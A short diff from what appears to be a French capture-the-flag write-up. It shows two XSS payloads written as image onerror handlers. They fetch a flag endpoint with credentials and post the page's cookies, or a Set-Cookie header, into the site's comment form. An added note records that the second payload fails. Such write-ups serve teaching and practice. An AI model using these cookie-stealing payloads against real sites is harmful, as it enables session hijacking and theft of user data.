@@ -88,3 +88,5 @@ Solution finale :
 <img src=x onerror="fetch('/api/init_csrf',{credentials:'include'}).then(()=>fetch('/flag',{credentials:'include'})).then(()=>{var c=document.cookie;fetch('/post_comment',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'comment=AFTER='+encodeURIComponent(c)})})"><img src=x onerror="fetch('/api/init_csrf',{credentials:'include'}).then(r=>{var sc=r.headers.get('set-cookie');fetch('/post_comment',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'comment=SC='+encodeURIComponent(sc)})})">
 ```
 
+
+La deuxième XSS ne marche pas puisque j'essaye d'accéder à un Set-Cookie 
